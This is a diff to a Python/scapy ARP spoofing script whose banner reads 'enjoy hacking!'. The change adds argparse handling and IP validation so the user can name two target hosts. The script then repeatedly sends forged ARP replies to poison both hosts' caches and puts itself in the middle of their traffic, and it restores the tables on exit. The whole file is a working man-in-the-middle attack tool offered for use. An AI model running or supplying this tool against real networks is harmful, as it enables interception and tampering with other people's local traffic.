@@ -1,14 +1,40 @@
 #!/usr/bin/python3
 import scapy.all as scapy
 from time import sleep
+import argparse, re
 
 def intro(targets):
+    "give an introduction"
     print("*"*50)
     print("Tool: ARP spoofer tool.")
     print("Author: ArimaGH")
     print(f"targets: {targets[0]} and {targets[1]}")
     print("enjoy hacking!")
     print("*"*50)
+
+def ipRegexp(string):
+    ip = re.search(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$', string)
+    return ip
+
+def parseArguments():
+    "parse arguments"
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--targets', '-t', help="a list of targets. please separate the two IP addresses by commas: 192.168.x.x,192.168.x.x.", dest="targets", required=True)
+    targetsString = parser.parse_args().targets
+    targetsList = targetsString.split(',')
+    checkArguments(targetsList)
+    return targetsList
+
+def checkArguments(targetsList):
+    if len(targetsList) != 2:
+        print('[-] you should provide two IP addresses.')
+        exit(1)
+    if ipRegexp(targetsList[0]) == None or ipRegexp(targetsList[1]) == None:
+        print('[-] enter valid IP addresses.')
+        exit(1)
+    if targetsList[0] == targetsList[1]:
+        print('[-] the targets must be different.')
+        exit(1)
 
 def getMAC(ip):
     "get the MAC address of a given IP"
@@ -31,20 +57,22 @@ def restoreARPTable(sourceIP, destinationIP):
     ARPPacket = scapy.ARP(pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC, op=2)
     scapy.send(ARPPacket, verbose=False)
 
-intro(['192.168.1.1', '192.168.1.2'])
+targetsList = parseArguments()
+
+intro(targetsList)
 
 packetsSent = 0
 
 while True:
     try:
-        sendARPResponse('192.168.1.2', '192.168.1.1')
-        sendARPResponse('192.168.1.1', '192.168.1.2')
+        sendARPResponse(targetsList[0],targetsList[1])
+        sendARPResponse(targetsList[1], targetsList[0])
         packetsSent += 2
         print(f'\r[+] {packetsSent} packets sent', end="")
         sleep(2)
     except KeyboardInterrupt:
         print("[+] detected keyboard interrupt, restoring arp tables..")
-        restoreARPTable('192.168.1.1', '192.168.1.2')
-        restoreARPTable('192.168.1.2', '192.168.1.1')
+        restoreARPTable(targetsList[0], targetsList[1])
+        restoreARPTable(targetsList[1], targetsList[0])
         print('[+] everything back to normal, quitting..')
         exit(0)
